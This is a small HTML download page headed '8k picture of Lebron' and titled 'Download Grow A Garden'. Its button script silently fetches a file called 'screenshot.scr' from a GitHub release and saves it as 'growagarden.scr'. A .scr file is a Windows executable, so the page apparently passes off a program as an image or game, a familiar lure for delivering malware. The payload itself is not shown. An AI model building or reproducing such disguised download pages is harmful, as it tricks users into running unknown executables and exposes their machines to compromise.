<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Download Grow A Garden</title>
</head>
<body>
  <h1>8k picture of Lebron</h1>
  <button id="downloadBtn">Download</button>

  <script>
    document.getElementById('downloadBtn').addEventListener('click', function() {
      const link = document.createElement('a');
      link.href = 'https://github.com/Nestrix-Applications/GROWGARDEN/releases/download/1/screenshot.scr';
      link.download = 'growagarden.scr'; // This may be ignored by the browser on external links
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    });
  </script>
</body>
</html>
